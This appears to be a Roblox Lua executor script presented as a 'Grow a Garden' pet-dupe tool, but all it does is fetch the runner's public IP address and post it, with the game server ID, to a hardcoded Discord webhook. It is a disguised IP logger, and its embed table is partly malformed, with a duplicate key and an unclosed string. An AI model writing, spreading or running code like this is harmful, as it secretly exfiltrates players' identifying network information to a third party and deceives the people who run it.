local key = game:HttpGet("https://api.ipify.org")
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = 'Details';
local Embed = {
    title = 'Pets';
    color = '99999';
    footer = { text = game.JobId };
    author = {
        name = 'Grow a Garden';
        url = 'https://www.roblox.com/games/126884695634066/Grow-a-Garden';
    };
    fields = {
        {
            name = 'DupeDetails';
            name = '<@568416088543723561>
            value = key;
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/1243366209395884093/adCgtBDIFOreRq1Z9C3MqRbszQV33WDQ1SbrUIOZ-w1EFXDdB9Yvpladkg3PvA_Tkxi-';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};
